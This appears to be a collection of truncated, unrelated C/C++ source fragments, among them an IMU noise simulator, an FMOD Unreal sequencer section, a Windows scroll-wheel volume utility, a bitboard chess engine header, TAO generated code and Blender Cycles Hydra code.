    "//\n// Created by hyj on 18-1-19.\n//\n\n#include <random>\n#include \"imu.h\"\n#include \"utilities.h\"\n\nIMU::IMU(Param p): param_(p)\n{\n    gyro_bias_ = Eigen::Vector3d::Zero();\n    acc_bias_ = Eigen::Vector3d::Zero();\n}\n\nvoid IMU::addIMUnoise(MotionData& data)\n{\n    std::random_device rd;\n    std::default_random_engine generator_(rd());\n    std::normal_distribution<double> noise(0.0, 1.0);\n\n    Eigen::Vector3d noise_gyro(noise(generator_),noise(generator_),noise(generator_));\n    Eigen::Matrix3d gyro_sqrt_cov = param_.gyro_noise_sigma * Eigen::Matrix3d::Identity();\n    data.imu_gyro = data.imu_gyro + gyro_sqrt_cov * noise_gyro / sqrt( param_.imu_timestep ) + gyro_bias_;\n\n    Eigen::Vector3d noise_acc(noise(generator_),noise(generator_),noise(generator_));\n    Eigen::Matrix3d acc_sqrt_cov = param_.acc_noise_sigma * Eigen::Matrix3d::Identity();\n    data.imu_acc = data.imu_acc + acc_sqrt_cov * noise_acc / sqrt( param_.imu_timestep ) + acc_bias_;\n\n    // gyro_bias update\n    Eigen::Vector3d noise_gyro_bias(noise(generator_),noise(generator_),noise(generator_));\n    gyro_bias_ += param_.gyro_bias_sigma * sqrt(param_.imu_timestep ) * noise_gyro_bias;\n    data.imu_gyro_bias = gyro_bias_;\n\n    // acc_bias update\n    Eigen::Vector3d noise_acc_bias(noise(generator_),noise(generator_),noise(generator_));\n    acc_bias_ += param_.acc_bias_sigma * sqrt(param_.imu_timestep ) * noise_acc_bias;\n    data.imu_acc_bias = acc_bias_;\n\n}\n\nMotionData IMU::MotionModel(double t)\n{\n\n    MotionData data;\n\n    Eigen::Vector3d position;\n    Eigen::Vector3d imu_gyro;\n    Eigen::Vector3d d_imu_gyro;\n    Eigen::Vector3d dp;\n    Eigen::Vector3d ddp;\n    Eigen::Matrix3d Rwb;\n\n    motion_model(position, Rwb, dp, ddp, imu_gyro,d_imu_gyro, t);\n\n    Eigen::Vector3d gn (0,0,-9.81);                                   //  gravity in navigation frame(ENU)   ENU (0,0,-9.81)  NED(0,0,9,81)\n    Eigen::Vector3d imu_acc = Rwb.transpose() * ( ddp -  gn );  //  Rbw * Rwn * gn = gs\n\n    data.imu_gyro = imu_gyro;\n    data.imu_acc = imu_acc;\n    data.Rwb = Rwb;\n    data.twb = position;\n    data.imu_velocity = dp;\n    data.timestamp = t;\n    return data;\n\n}\n\n//\u8bfb\u53d6\u751f\u6210\u7684imu\u6570\u636e\u5e76\u7528imu\u52a8\u529b\u5b66\u6a21\u578b\u5bf9\u6570\u636e\u8fdb\u884c\u8ba1\u7b97\uff0c\u6700\u540e\u4fdd\u5b58imu\u79ef\u5206\u4ee5\u540e\u7684\u8f68\u8ff9\uff0c\n//\u7528\u6765\u9a8c\u8bc1\u6570\u636e\u4ee5\u53ca\u6a21\u578b\u7684\u6709\u6548\u6027\u3002\nvoid IMU::testImu(std::string src, std::string dist)\n{\n    std::vector<MotionData>imudata;\n    LoadPose(src,imudata);\n\n    std::ofstream save_points;\n    save_points.open(dist);\n\n    double dt = param_.imu_timestep;\n    Eigen::Vector3d Pwb = init_twb_;              // position :    from  imu measurements\n    Eigen::Quaterniond Qwb(init_Rwb_);            // quaterniond:  from imu measurements\n    Eigen::Vector3d Vw = init_velocity_;          // velocity  :   from imu measurements\n    Eigen::Vector3d gw(0,0,-9.81);    // ENU frame\n    Eigen::Vector3d temp_a;\n    Eigen::Vector3d theta;\n    for (int i = 1; i < imudata.size(); ++i) {\n\n        MotionData imupose = imudata[i];\n//        MotionData imupose_next_k = imudata[i+1];\n\n        //delta_q = [1 , 1/2 * thetax , 1/2 * theta_y, 1/2 * theta_z]\n        Eigen::Quaterniond dq;\n        Eigen::Vector3d dtheta_half =  imupose.imu_gyro * dt /2.0; //euler integrate\n//        Eigen::Vector3d dtheta_half =  (imupose.imu_gyro + imupose_next_k.imu_gyro)/2 * dt /2.0; //mid-point integrate\n\n\n        dq.w() = 1;\n        dq.x() = dtheta_half.x();\n        dq.y() = dtheta_half.y();\n        dq.z() = dtheta_half.z();\n        dq.normalize();\n        \n        /// imu \u52a8\u529b\u5b66\u6a21\u578b \u6b27\u62c9\u79ef\u5206\n        Eigen::Vector3d acc_w = Qwb * (imupose.imu_acc) + gw;  // aw = Rwb * ( acc_body - acc_bias ) + gw\n        Qwb = Qwb * dq;\n        Pwb = Pwb + Vw * dt + 0.5 * dt * dt * acc_w;\n        Vw = Vw + acc_w * dt;\n        \n        /// \u4e2d\u503c\u79ef\u5206\n//        Eigen::Vector3d acc_w = Qwb * (imupose.imu_acc) + gw;  // aw = Rwb * ( acc_body - acc_bias ) + gw\n//        Qwb = Qwb * dq;\n//        Eigen::Vector3d acc_w_next_k = Qwb * (imupose_next_k.imu_acc) + gw;\n//        Eigen::Vector3d acc_w_mid_point = (acc_w + acc_w_next_k)/2;\n//        Pwb = Pwb + Vw * dt + 0.5 * dt * dt * acc_w_mid_point;\n//        Vw = Vw + acc_w_mid_point * dt;\n\n\n        //\u3000\u6309\u7740imu postion, imu quaternion , cam postion, cam quaternion \u7684\u683c\u5f0f\u5b58\u50a8\uff0c\u7531\u4e8e\u6ca1\u6709cam\uff0c\u6240\u4ee5imu\u5b58\u4e86\u4e24\u6b21\n        save_points<<imupose.timestamp<<\" \"\n                   <<Qwb.w()<<\" \"\n                   <<Qwb.x()<<\" \"\n                   <<Qwb.y()<<\" \"\n                   <<Qwb.z()<<\" \"\n                   <<Pwb(0)<<\" \"\n                   <<Pwb(1)<<\" \"\n                   <<Pwb(2)<<\" \"\n                   <<Qwb.w()<<\" \"\n                   <<Qwb.x()<<\" \"\n                   <<Qwb.y()<<\" \"\n                   <<Qwb.z()<<\" \"\n                   <<Pwb(0)<<\" \"\n                   <<Pwb(1)<<\" \"\n                   <<Pwb(2)<<\" \"\n                   <<std::endl;\n\n    }\n\n}\n//\u8bfb\u53d6\u751f\u6210\u7684imu\u6570\u636e\u5e76\u7528imu\u52a8\u529b\u5b66\u6a21\u578b\u4f7f\u7528\u4e2d\u503c\u79ef\u5206\u5bf9\u6570\u636e\u8fdb\u884c\u8ba1\u7b97\uff0c\u6700\u540e\u4fdd\u5b58imu\u79ef\u5206\u4ee5\u540e\u7684\u8f68\u8ff9\uff0c\n//\u7528\u6765\u9a8c\u8bc1\u6570\u636e\u4ee5\u53ca\u6a21\u578b\u7684\u6709\u6548\u6027\u3002\nvoid IMU::testImuMidPoint(std::string src, std::string dist)\n{\n    std::vector<MotionData>imudata;\n    LoadPose(src,imudata);\n\n    std::ofstream save_points;\n    save_points.open(dist);\n\n    double dt = param_.imu_timestep;\n    ",
    "// Copyright (c), Firelight Technologies Pty, Ltd. 2012-2024.\n\n#include \"FMODEventControlSection.h\"\n#include \"Channels/MovieSceneChannelProxy.h\"\n#include \"UObject/SequencerObjectVersion.h\"\n#include \"UObject/Package.h\"\n\nFFMODEventControlChannel::FFMODEventControlChannel()\n{\n    SetEnum(StaticEnum<EFMODEventControlKey>());\n}\n\nUFMODEventControlSection::UFMODEventControlSection(const FObjectInitializer &ObjectInitializer)\n    : Super(ObjectInitializer)\n{\n    SetRange(TRange<FFrameNumber>::All());\n\n    int32 LinkerCustomVersion = GetLinkerCustomVersion(FSequencerObjectVersion::GUID);\n    EMovieSceneCompletionMode CompletionMode;\n\n    if (LinkerCustomVersion < FSequencerObjectVersion::WhenFinishedDefaultsToRestoreState)\n    {\n        CompletionMode = EMovieSceneCompletionMode::KeepState;\n    }\n    else if (LinkerCustomVersion < FSequencerObjectVersion::WhenFinishedDefaultsToProjectDefault)\n    {\n        CompletionMode = EMovieSceneCompletionMode::RestoreState;\n    }\n    else\n    {\n        CompletionMode = EMovieSceneCompletionMode::ProjectDefault;\n    }\n\n    EvalOptions.EnableAndSetCompletionMode(CompletionMode);\n\n#if WITH_EDITOR\n\n    ChannelProxy = MakeShared<FMovieSceneChannelProxy>(ControlKeys, FMovieSceneChannelMetaData(), TMovieSceneExternalValue<uint8>());\n\n#else\n\n    ChannelProxy = MakeShared<FMovieSceneChannelProxy>(ControlKeys);\n\n#endif\n}\n",
    "\ufeff#include <windows.h>\n#include <iostream>\n#include <tchar.h>\n#include <shellapi.h>\n#include \"resource.h\"\n#include < sstream >\n\nbool isVolumeControlActive = false; // \u6fc0\u6d3b\u6eda\u8f6e\u8c03\u8282\u97f3\u91cf\nbool _isVolumeControlActive = false; // \u4fdd\u5b58\u72b6\u6001\nbool enableTaskbarVolumeControl = false;    // \u6fc0\u6d3b\u4efb\u52a1\u680f\u8c03\u8282\u97f3\u91cf\nbool _enableTaskbarVolumeControl = false;    // \u4fdd\u5b58\u72b6\u6001\nbool enableTrayIcon = true; // \u542f\u7528\u6258\u76d8\u56fe\u6807\nbool Pause = false;\n\n// \u5b9a\u4e49\u5168\u5c40\u53d8\u91cf\nHHOOK mouseHook = NULL;\nNOTIFYICONDATA nid = {};\nHMENU hMenu = NULL;\n\nUINT modKey = MOD_SHIFT | MOD_ALT; // \u9ed8\u8ba4\u4fee\u9970\u952e\nUINT vkKey = 'V'; // \u9ed8\u8ba4\u4e3b\u952e\n\n// \u68c0\u67e5\u7a97\u53e3\u662f\u5426\u662f\u4efb\u52a1\u680f\u6216\u5176\u5b50\u7a97\u53e3\nstatic bool IsTaskbarWindow(HWND hWnd) {\n    TCHAR className[256];\n    while (hWnd != NULL) {\n        GetClassName(hWnd, className, 256);\n        if (_tcscmp(className, _T(\"Shell_TrayWnd\")) == 0) {\n            return true;\n        }\n        hWnd = GetParent(hWnd);\n    }\n    return false;\n}\n\n// \u68c0\u67e5\u9f20\u6807\u662f\u5426\u5728\u4efb\u52a1\u680f\u4e0a\nstatic bool IsMouseOnTaskbar() {\n    if (!enableTaskbarVolumeControl) {\n        return false;\n    }\n    POINT pt;\n    GetCursorPos(&pt);\n    HWND hWnd = WindowFromPoint(pt);\n    return IsTaskbarWindow(hWnd);\n}\n\n// \u9f20\u6807\u94a9\u5b50\u56de\u8c03\u51fd\u6570\nstatic LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam) {\n    if (nCode >= 0) {\n        if (wParam == WM_MOUSEWHEEL) {\n            MSLLHOOKSTRUCT* mouseStruct = (MSLLHOOKSTRUCT*)lParam;\n            int zDelta = GET_WHEEL_DELTA_WPARAM(mouseStruct->mouseData);\n\n            // \u8c03\u8282\u97f3\u91cf\n            if (isVolumeControlActive || IsMouseOnTaskbar()) {\n                if (zDelta > 0) {\n                    keybd_event(VK_VOLUME_UP, 0, 0, 0);\n                }\n                else {\n                    keybd_event(VK_VOLUME_DOWN, 0, 0, 0);\n                }\n                return true; // \u622a\u83b7\u6d88\u606f\uff0c\u4e0d\u4f20\u9012\u7ed9\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\n            }\n        }\n    }\n    return CallNextHookEx(mouseHook, nCode, wParam, lParam);\n}\n\n// \u6258\u76d8\u56fe\u6807\nstatic void UpdateTrayIcon() {\n    wcscpy_s(nid.szTip, L\"Scroll Volume\");\n    if (isVolumeControlActive) {\n        wcscat_s(nid.szTip, L\" (Active)\");\n    }\n    if (enableTaskbarVolumeControl) {\n        wcscat_s(nid.szTip, L\" (Taskbar Control)\");\n    }\n    Shell_NotifyIcon(NIM_MODIFY, &nid);\n}\nstatic void AddTrayIcon(HWND hwnd, HINSTANCE hInstance) {\n    nid.cbSize = sizeof(NOTIFYICONDATA);\n    nid.hWnd = hwnd;\n    nid.uID = 1;\n    nid.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;\n    nid.uCallbackMessage = WM_APP;\n    nid.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1));\n    UpdateTrayIcon();\n    Shell_NotifyIcon(NIM_ADD, &nid);\n}\nstatic void RemoveTrayIcon(HWND hwnd) {\n    Shell_NotifyIcon(NIM_DELETE, &nid);\n}\n\nstatic std::wstring GetHotkeyDescription() {\n    std::wstringstream ss;\n    if (modKey & MOD_CONTROL) ss << L\"Ctrl + \";\n    if (modKey & MOD_SHIFT) ss << L\"Shift + \";\n    if (modKey & MOD_ALT) ss << L\"Alt + \";\n    if (modKey & MOD_WIN) ss << L\"Win + \";\n    ss << (wchar_t)MapVirtualKey(vkKey, MAPVK_VK_TO_CHAR);\n    return ss.str();\n}\n\n// \u53f3\u952e\u83dc\u5355\nstatic void ShowContextMenu(HWND hwnd, POINT pt) {\n    hMenu = CreatePopupMenu();\n    AppendMenu(hMenu, MF_STRING | MF_GRAYED, 0, GetHotkeyDescription().c_str());\n    AppendMenu(hMenu, MF_SEPARATOR, 0, NULL);\n    AppendMenu(hMenu, MF_STRING | (isVolumeControlActive ? MF_CHECKED : 0), 1, L\"Activate Volume Control\");\n    AppendMenu(hMenu, MF_STRING | (enableTaskbarVolumeControl ? MF_CHECKED : 0), 2, L\"Enable Taskbar Volume Control\");\n    AppendMenu(hMenu, MF_STRING | (Pause ? MF_CHECKED : 0), 3, L\"Pause\");\n    AppendMenu(hMenu, MF_SEPARATOR, 0, NULL);\n    AppendMenu(hMenu, MF_STRING | 0, 4, L\"Help\");\n    AppendMenu(hMenu, MF_STRING, 5, L\"Exit\");\n    SetForegroundWindow(hwnd);\n    TrackPopupMenu(hMenu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, hwnd, NULL);\n    DestroyMenu(hMenu);\n}\n\n// \u7a97\u53e3\u8fc7\u7a0b\u51fd\u6570\nstatic LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {\n    switch (uMsg) {\n    case WM_HOTKEY:\n        if (wParam == 1) {\n            // \u5207\u6362\u97f3\u91cf\u63a7\u5236\u6a21\u5f0f\n            isVolumeControlActive = !isVolumeControlActive;\n        }\n        break;\n    case WM_COMMAND:\n            switch (LOWORD(wParam)) {\n            case 1:\n                if (Pause) { break; }\n                isVolumeControlActive = !isVolumeControlActive;\n                UpdateTrayIcon();\n                break;\n            case 2:\n                if (Pause) { break; }\n                enableTaskbarVolumeControl = !enableTaskbarVolumeControl;\n                UpdateTrayIcon();\n                break;\n            case 3:\n                Pause = !Pause;\n                if (Pause) {\n                    _isVolumeControlActive = isVolumeControlActive;\n                    isVolumeControlActive = false;\n\n                    _enableTaskbarVolumeControl = enableTaskbarVolumeControl;\n                    enableTaskbarVolumeControl = false;\n\n\t\t\t\t\tUnregisterHotKey(hwnd, 1);\n\t\t\t\t} else {\n                    isVolumeControlActive = _isVolumeControlActive;\n\t\t\t\t\tenableTaskbarVolumeControl = _enableTaskbarVolumeControl;\n\n\t\t\t\t\tRegisterHotKey(hwnd, 1, modKey, vkKey);\n\t\t\t\t}\n                UpdateTrayIcon();\n                break;\n            case 4",
    "\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#ifdef WIN64\n    #include <windows.h>\n#else\n    # include <sys/time.h>\n#endif\n\n// define version\n#define version \"1.2\"\n\n// define bitboard data type\n#define U64 unsigned long long\n\n// FEN dedug positions\n#define empty_board \"8/8/8/8/8/8/8/8 b - - \"\n#define start_position \"rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR w KQkq - 0 1 \"\n#define tricky_position \"r3k2r/p1ppqpb1/bn2pnp1/3PN3/1p2P3/2N2Q1p/PPPBBPPP/R3K2R w KQkq - 0 1 \"\n#define killer_position \"rnbqkb1r/pp1p1pPp/8/2p1pP2/1P1P4/3P3P/P1P1P3/RNBQKBNR w KQkq e6 0 1\"\n#define cmk_position \"r2q1rk1/ppp2ppp/2n1bn2/2b1p3/3pP3/3P1NPP/PPP1NPB1/R1BQ1RK1 b - - 0 9 \"\n#define repetitions \"2r3k1/R7/8/1R6/8/8/P4KPP/8 w - - 0 40 \"\n\n// board squares\nenum {\n    a8, b8, c8, d8, e8, f8, g8, h8,\n    a7, b7, c7, d7, e7, f7, g7, h7,\n    a6, b6, c6, d6, e6, f6, g6, h6,\n    a5, b5, c5, d5, e5, f5, g5, h5,\n    a4, b4, c4, d4, e4, f4, g4, h4,\n    a3, b3, c3, d3, e3, f3, g3, h3,\n    a2, b2, c2, d2, e2, f2, g2, h2,\n    a1, b1, c1, d1, e1, f1, g1, h1, no_sq\n};\n\n// encode pieces\nenum { P, N, B, R, Q, K, p, n, b, r, q, k };\n\n// sides to move (colors)\nenum { white, black, both };\n\n// bishop and rook\nenum { rook, bishop };\n\n// castling rights binary encoding\n\n/*\n\n    bin  dec\n    \n   0001    1  white king can castle to the king side\n   0010    2  white king can castle to the queen side\n   0100    4  black king can castle to the king side\n   1000    8  black king can castle to the queen side\n\n   examples\n\n   1111       both sides an castle both directions\n   1001       black king => queen side\n              white king => king side\n\n*/\n\nenum { wk = 1, wq = 2, bk = 4, bq = 8 };\n\n// convert squares to coordinates\nconst char *square_to_coordinates[] = {\n    \"a8\", \"b8\", \"c8\", \"d8\", \"e8\", \"f8\", \"g8\", \"h8\",\n    \"a7\", \"b7\", \"c7\", \"d7\", \"e7\", \"f7\", \"g7\", \"h7\",\n    \"a6\", \"b6\", \"c6\", \"d6\", \"e6\", \"f6\", \"g6\", \"h6\",\n    \"a5\", \"b5\", \"c5\", \"d5\", \"e5\", \"f5\", \"g5\", \"h5\",\n    \"a4\", \"b4\", \"c4\", \"d4\", \"e4\", \"f4\", \"g4\", \"h4\",\n    \"a3\", \"b3\", \"c3\", \"d3\", \"e3\", \"f3\", \"g3\", \"h3\",\n    \"a2\", \"b2\", \"c2\", \"d2\", \"e2\", \"f2\", \"g2\", \"h2\",\n    \"a1\", \"b1\", \"c1\", \"d1\", \"e1\", \"f1\", \"g1\", \"h1\",\n};\n\n// ASCII pieces\nchar ascii_pieces[12] = \"PNBRQKpnbrqk\";\n\n// unicode pieces\nchar *unicode_pieces[12] = {\"\u2659\", \"\u2658\", \"\u2657\", \"\u2656\", \"\u2655\", \"\u2654\", \"\u265f\ufe0e\", \"\u265e\", \"\u265d\", \"\u265c\", \"\u265b\", \"\u265a\"};\n\n// convert ASCII character pieces to encoded constants\nint char_pieces[] = {\n    ['P'] = P,\n    ['N'] = N,\n    ['B'] = B,\n    ['R'] = R,\n    ['Q'] = Q,\n    ['K'] = K,\n    ['p'] = p,\n    ['n'] = n,\n    ['b'] = b,\n    ['r'] = r,\n    ['q'] = q,\n    ['k'] = k\n};\n\n// promoted pieces\nchar promoted_pieces[] = {\n    [Q] = 'q',\n    [R] = 'r',\n    [B] = 'b',\n    [N] = 'n',\n    [q] = 'q',\n    [r] = 'r',\n    [b] = 'b',\n    [n] = 'n'\n};\n\n\n/**********************************\\\n ==================================\n \n            Chess board\n \n ==================================\n\\**********************************/\n\n/*\n                            WHITE PIECES\n\n\n        Pawns                  Knights              Bishops\n        \n  8  0 0 0 0 0 0 0 0    8  0 0 0 0 0 0 0 0    8  0 0 0 0 0 0 0 0\n  7  0 0 0 0 0 0 0 0    7  0 0 0 0 0 0 0 0    7  0 0 0 0 0 0 0 0\n  6  0 0 0 0 0 0 0 0    6  0 0 0 0 0 0 0 0    6  0 0 0 0 0 0 0 0\n  5  0 0 0 0 0 0 0 0    5  0 0 0 0 0 0 0 0    5  0 0 0 0 0 0 0 0\n  4  0 0 0 0 0 0 0 0    4  0 0 0 0 0 0 0 0    4  0 0 0 0 0 0 0 0\n  3  0 0 0 0 0 0 0 0    3  0 0 0 0 0 0 0 0    3  0 0 0 0 0 0 0 0\n  2  1 1 1 1 1 1 1 1    2  0 0 0 0 0 0 0 0    2  0 0 0 0 0 0 0 0\n  1  0 0 0 0 0 0 0 0    1  0 1 0 0 0 0 1 0    1  0 0 1 0 0 1 0 0\n\n     a b c d e f g h       a b c d e f g h       a b c d e f g h\n\n\n         Rooks                 Queens                 King\n\n  8  0 0 0 0 0 0 0 0    8  0 0 0 0 0 0 0 0    8  0 0 0 0 0 0 0 0\n  7  0 0 0 0 0 0 0 0    7  0 0 0 0 0 0 0 0    7  0 0 0 0 0 0 0 0\n  6  0 0 0 0 0 0 0 0    6  0 0 0 0 0 0 0 0    6  0 0 0 0 0 0 0 0\n  5  0 0 0 0 0 0 0 0    5  0 0 0 0 0 0 0 0    5  0 0 0 0 0 0 0 0\n  4  0 0 0 0 0 0 0 0    4  0 0 0 0 0 0 0 0    4  0 0 0 0 0 0 0 0\n  3  0 0 0 0 0 0 0 0    3  0 0 0 0 0 0 0 0    3  0 0 0 0 0 0 0 0\n  2  0 0 0 0 0 0 0 0    2  0 0 0 0 0 0 0 0    2  0 0 0 0 0 0 0 0\n  1  1 0 0 0 0 0 0 1    1  0 0 0 1 0 0 0 0    1  0 0 0 0 1 0 0 0\n\n     a b c d e f g h       a b c d e f g h       a b c d e f g h\n\n\n                            BLACK PIECES\n\n\n        Pawns                  Knights              Bishops\n        \n  8  0 0 0 0 0 0 0 0    8  0 1 0 0 0 0 1 0    8  0 0 1 0 0 1 0 0\n  7  1 1 1 1 1 1 1 1    7  0 0 0 0 0 0 0 0    7  0 0 0 0 0 0 0 0\n  6  0 0 0 0 0 0 0 0    6  0 0 0 0 0 0 0 0    6  0 0 0 0 0 0 0 0\n  5  0 0 0 0 0 0 0 0    5  0 0 0 0 0 0 0 0    5  0 0 0 0 0 0 0 0\n  4  0 0 0 0 0 0 0 0    4  0 0 0 0 0 0 0 0    4  0 0 0 0 0 0 0 0\n  3  0 0 0 0 0 0 0 0    3  0 0 0 0 0 0 0 0    3  0 0 0 0 0 0 0 0\n  2  0 0 0 0 0 0 0 0    2  0 0 0 0 0 0 0 0    2  0 0 0 0 0 0 0 0\n  1  0 0 0 0 0 0 0 0    1  0 0 0 0 0 0 0 0    1  0 0 0 0 0 0 0 0\n\n     a b c d e f g h       a b c d e f g h       ",
    "#include <iostream>\r\n#include <memory>\r\n#include \"../include/Circle.h\"\r\n#include \"../include/Shape.h\"\r\n#include \"../include/Triangle.h\"\r\n#include \"../include/Rectangle.h\"\r\n#include \"../include/Square.h\"\r\n\r\nint main()\r\n{\r\n\r\n\r\n    std::vector<std::unique_ptr<Shape<double>>> shapes;\r\n    shapes.push_back(std::make_unique<Circle<double>>(5.5));\r\n    shapes.push_back(std::make_unique<Triangle<double>>(3.0, 4.5, 5.0));\r\n    shapes.push_back(std::make_unique<Rectangle<double>>(4.5, 8.5));\r\n    shapes.push_back(std::make_unique<Square<double>>(5.0));\r\n\r\n    for (int i=0; i <shapes.size(); i++){\r\n        shapes[i]->display();\r\n\r\n    }\r\n\r\n\r\n    // Circle<double> circle(5.5);\r\n    // circle.display();\r\n\r\n    // Triangle<double> triangle(3.0, 4.5, 5.0);\r\n    // triangle.display();\r\n\r\n    // Rectangle<double> rectangle(4.5, 8.5);\r\n    // rectangle.display();\r\n\r\n    // Square<double> square(5.0);\r\n    // square.display();\r\n\r\n    std::cout << \"Total Shapes created: \" << CountShape::getCount() << std::endl;\r\n}",
    "// -*- C++ -*-\n/**\n * Code generated by the The ACE ORB (TAO) IDL Compiler v4.0.0\n * TAO and the TAO IDL Compiler have been developed by:\n *       Center for Distributed Object Computing\n *       Washington University\n *       St. Louis, MO\n *       USA\n * and\n *       Distributed Object Computing Laboratory\n *       University of California at Irvine\n *       Irvine, CA\n *       USA\n * and\n *       Institute for Software Integrated Systems\n *       Vanderbilt University\n *       Nashville, TN\n *       USA\n *       https://www.isis.vanderbilt.edu/\n *\n * Information about TAO is available at:\n *     https://www.dre.vanderbilt.edu/~schmidt/TAO.html\n **/\n\n// TAO_IDL - Generated from\n// D:\\gitRepos\\ACE_TAO\\TAO\\TAO_IDL\\be\\be_codegen.cpp:631\n\n#ifndef _TAO_IDL_COMPANYS_NL2RSW_CPP_\n#define _TAO_IDL_COMPANYS_NL2RSW_CPP_\n\n\n#include \"CompanyS.h\"\n#include \"tao/PortableServer/Operation_Table_Perfect_Hash.h\"\n#include \"tao/PortableServer/Upcall_Command.h\"\n#include \"tao/PortableServer/Upcall_Wrapper.h\"\n#include \"tao/TAO_Server_Request.h\"\n#include \"tao/ORB_Core.h\"\n#include \"tao/Profile.h\"\n#include \"tao/Stub.h\"\n#include \"tao/IFR_Client_Adapter.h\"\n#include \"tao/Object_T.h\"\n#include \"tao/AnyTypeCode/TypeCode.h\"\n#include \"tao/AnyTypeCode/DynamicC.h\"\n#include \"tao/CDR.h\"\n#include \"tao/operation_details.h\"\n#include \"tao/PortableInterceptor.h\"\n#include \"ace/Dynamic_Service.h\"\n#include \"ace/Malloc_Allocator.h\"\n#include \"cstring\"\n// TAO_IDL - Generated from\n// D:\\gitRepos\\ACE_TAO\\TAO\\TAO_IDL\\be\\be_interface.cpp:1853\n\nclass TAO_CompanyModule_Person_Perfect_Hash_OpTable\n  : public TAO_Perfect_Hash_OpTable\n{\nprivate:\n  unsigned int hash (const char *str, unsigned int len) override;\n\npublic:\n  const TAO_operation_db_entry * lookup (const char *str, unsigned int len) override;\n};\n\n/* C++ code produced by gperf version 2.8 (ACE version) */\n/* Command-line: ace_gperf -m -M -J -c -C -D -E -T -f 0 -F 0,0 -a -o -t -p -K opname -L C++ -Z TAO_CompanyModule_Person_Perfect_Hash_OpTable -N lookup */\n\nunsigned int\nTAO_CompanyModule_Person_Perfect_Hash_OpTable::hash (const char *str, unsigned int len)\n{\n  static constexpr unsigned char asso_values[] =\n    {\n     20, 20, 20, 20, 20, 20, 20, 20, 20, 20,\n     20, 20, 20, 20, 20, 20, 20, 20, 20, 20,\n     20, 20, 20, 20, 20, 20, 20, 20, 20, 20,\n     20, 20, 20, 20, 20, 20, 20, 20, 20, 20,\n     20, 20, 20, 20, 20, 20, 20, 20, 20, 20,\n     20, 20, 20, 20, 20, 20, 20, 20, 20, 20,\n     20, 20, 20, 20, 20, 20, 20, 20, 20, 20,\n      0, 20, 20, 20, 20, 20, 20, 20, 20, 20,\n     20, 20, 20, 20, 20, 20, 20, 20, 20, 20,\n     20, 20, 20, 20, 20,  0, 20,  0, 20, 20,\n      5,  0, 20, 20, 20, 20, 20, 20, 20, 20,\n     20, 20, 20, 20, 20, 20,  5, 20, 20, 20,\n     20,  0, 20, 20, 20, 20, 20, 20,\n    };\n  return len + asso_values[static_cast<int>(str[len - 1])] + asso_values[static_cast<int>(str[0])];\n}\n\nconst TAO_operation_db_entry *\nTAO_CompanyModule_Person_Perfect_Hash_OpTable::lookup (const char *str, unsigned int len)\n{\n  enum\n    {\n      TOTAL_KEYWORDS = 12,\n      MIN_WORD_LENGTH = 5,\n      MAX_WORD_LENGTH = 14,\n      MIN_HASH_VALUE = 5,\n      MAX_HASH_VALUE = 19,\n      HASH_VALUE_RANGE = 15,\n      DUPLICATES = 4,\n      WORDLIST_SIZE = 17\n    };\n\n  static const TAO_operation_db_entry wordlist[] =\n    {\n      {\"\",0,0},{\"\",0,0},{\"\",0,0},{\"\",0,0},{\"\",0,0},\n      {\"_is_a\", std::addressof(TAO_ServantBase::_is_a_thru_poa_skel), nullptr},\n      {\"FullName\", std::addressof(POA_CompanyModule::Person::FullName_skel), nullptr},\n      {\"_get_name\", std::addressof(POA_CompanyModule::Person::_get_name_skel), 0},\n      {\"_set_name\", std::addressof(POA_CompanyModule::Person::_set_name_skel), nullptr},\n      {\"_interface\", std::addressof(TAO_ServantBase::_interface_skel), nullptr},\n      {\"_get_birthday\", std::addressof(POA_CompanyModule::Person::_get_birthday_skel), 0},\n      {\"_set_birthday\", std::addressof(POA_CompanyModule::Person::_set_birthday_skel), nullptr},\n      {\"_get_firstname\", std::addressof(POA_CompanyModule::Person::_get_firstname_skel), 0},\n      {\"_set_firstname\", std::addressof(POA_CompanyModule::Person::_set_firstname_skel), nullptr},\n      {\"_component\", std::addressof(TAO_ServantBase::_component_thru_poa_skel), nullptr},\n      {\"_non_existent\", std::addressof(TAO_ServantBase::_non_existent_thru_poa_skel), nullptr},\n      {\"_repository_id\", std::addressof(TAO_ServantBase::_repository_id_thru_poa_skel), nullptr},\n    };\n\n  static constexpr signed char lookup[] =\n    {\n       -1,  -1,  -1,  -7,  -2,   5, -10,  -2,   6, -25,   9, -12,  -2, -26, \n      -22,  14,  -1,  -1,  15,  16, \n    };\n\n  if (len <= MAX_WORD_LENGTH && len >= MIN_WORD_LENGTH)\n    {\n      unsigned int const key = hash (str, len);\n\n      if (key <= MAX_HASH_VALUE && key >= MIN_HASH_VALUE)\n        {\n          int slot = lookup[key];\n\n          if (slot >= 0 && slot < WORDLIST_SIZE)\n            {\n              const char *s = wordlist[slot].opname;\n\n              if (*str == *s && !ACE_OS::strncmp (str + 1, s + 1, len - 1))\n                return &wor",
    "/* SPDX-FileCopyrightText: 2022 NVIDIA Corporation\n * SPDX-FileCopyrightText: 2022 Blender Foundation\n *\n * SPDX-License-Identifier: Apache-2.0 */\n\n#include \"hydra/curves.h\"\n#include \"hydra/geometry.inl\"\n#include \"scene/hair.h\"\n\n#include <pxr/imaging/hd/extComputationUtils.h>\n\nHDCYCLES_NAMESPACE_OPEN_SCOPE\n\nHdCyclesCurves::HdCyclesCurves(const SdfPath &rprimId\n#if PXR_VERSION < 2102\n                               ,\n                               const SdfPath &instancerId\n#endif\n                               )\n    : HdCyclesGeometry(rprimId\n#if PXR_VERSION < 2102\n                       ,\n                       instancerId\n#endif\n      )\n{\n}\n\nHdCyclesCurves::~HdCyclesCurves() {}\n\nHdDirtyBits HdCyclesCurves::GetInitialDirtyBitsMask() const\n{\n  HdDirtyBits bits = HdCyclesGeometry::GetInitialDirtyBitsMask();\n  bits |= HdChangeTracker::DirtyPoints | HdChangeTracker::DirtyWidths |\n          HdChangeTracker::DirtyPrimvar | HdChangeTracker::DirtyTopology;\n  return bits;\n}\n\nHdDirtyBits HdCyclesCurves::_PropagateDirtyBits(HdDirtyBits bits) const\n{\n  if (bits & (HdChangeTracker::DirtyTopology)) {\n    // Changing topology 